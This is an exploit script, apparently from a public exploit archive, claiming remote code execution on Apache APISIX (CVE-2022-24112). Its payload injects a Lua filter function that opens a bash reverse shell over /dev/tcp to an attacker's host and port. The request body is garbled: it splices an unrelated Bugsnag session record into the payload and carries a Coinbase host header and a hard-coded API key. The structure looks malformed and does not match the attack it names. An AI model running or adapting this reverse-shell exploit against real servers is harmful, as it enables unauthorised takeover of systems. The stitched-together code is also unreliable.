# Exploit Title: Apache APISIX 2.12.1 - Remote Code Execution (RCE)
# Date: 2022-03-16
# Exploit Author: Ven3xy
# Vendor Homepage: https://apisix.apache.org/
# Version: Apache APISIX 1.3 – 2.12.1
# Tested on: CentOS 7
# CVE : CVE-2022-24112


import requests
import sys

class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]


def banner():
    run = color_random[6]+'''\n                                   .     ,
        _.._ * __*\./ ___  _ \./._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |
          |                     |
\n'''
    run2 = color_random[2]+'''\t\t(CVE-2022-24112)\n'''
    run3 = color_random[4]+'''{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }\n\n'''
    print(run+run2+run3)

if (len(sys.argv) != 4):
    banner()
    print("[!] Usage   : ./apisix-exploit.py <target_url> <lhost> <lport>")
    exit()

else:
    banner()
    target_url = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

headers1 = {
    'Host': 'sessions.coinbase.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Content-Length': '540',
    'Connection': 'close',
}

headers2 = {
    'Host': 'sessions.coinbase.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Connection': 'close',
}

json_data = {"notifier":{"name":"Bugsnag JavaScript","version":"7.17.4","url":"https://github.com/bugsnag/bugsnag-js"},"device":{"locale":"en-US","userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0","orientation":"landscape-primary","id":"clelhhcdy00002063cjbfsk9q"},"app":{"releaseStage":"production","version":"8add44dfa65fbca508c794aa8af6baf6b046623d","type":"browser"},"sessions":[{"id":"clelronfo00002063rduy1i8b","startedAt":"2023-02-26T19:11:28.164Z","user":{}},'body': '{"uri":"/rms/fzxewh","upstream":{"type":"roundrobin","nodes":{"schmidt-schaefer.com":1}},"name":"wthtzv","filter_func":"function(vars) os.execute(\'bash -c \\\\\\"0<&160-;exec 160<>/dev/tcp/'+lhost+'/'+lport+';sh <&160 >&160 2>&160\\\\\\"\'); return true end"}'}



response1 = requests.post(target_url, headers=headers1, json=json_data, verify=True)

response2 = requests.get(target_url, headers=headers2, verify=True)
